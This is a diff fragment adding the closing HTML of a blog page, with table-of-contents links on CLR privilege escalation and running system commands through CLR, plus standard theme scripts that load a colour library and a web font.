+        </li>
+        <li><a href="#clr提权">CLR提权</a>
+          <ol>
+            <li><a href="#使用clr执行系统命令">使用CLR执行系统命令</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+                </div>
+            </section>
+        </aside>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
